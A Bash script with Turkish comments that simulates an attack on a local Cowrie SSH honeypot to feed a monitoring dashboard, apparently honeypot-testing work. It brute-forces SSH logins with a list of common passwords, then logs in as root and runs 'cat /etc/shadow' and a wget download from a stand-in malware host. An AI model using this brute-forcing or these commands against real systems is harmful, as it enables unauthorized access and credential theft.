#!/bin/bash

HOST="127.0.0.1"
PORT="2222"
PASSWORDS=("123456" "admin" "password" "root" "qwerty" "iloveyou")
USERNAMES=("root" "admin" "user" "test")
SUCCESS_PASS="root"   # Cowrie varsayılan olarak root:root'u kabul eder

echo "=== Otomatik Saldırı Simülasyonu Başlıyor ==="
echo ""

# 1. Birkaç başarısız giriş denemesi
for i in {1..5}; do
    USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    echo "[FAIL] Deneniyor: $USER:$PASS"
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p "$PORT" "$USER@$HOST" exit 2>/dev/null
    sleep 0.5
done

# 2. Başarılı giriş ve komut çalıştırma (Cowrie root:root kabul eder)
echo ""
echo "[SUCCESS] Başarılı giriş yapılıyor: root:root"
sshpass -p "$SUCCESS_PASS" ssh -o StrictHostKeyChecking=no -p "$PORT" root@$HOST << 'EOF'
ls -la
cat /etc/shadow
wget http://malware.example.com/badfile.sh
uname -a
ps aux
EOF

echo ""
echo "=== Simülasyon tamamlandı. Dashboard'u kontrol et: http://localhost:5000 ==="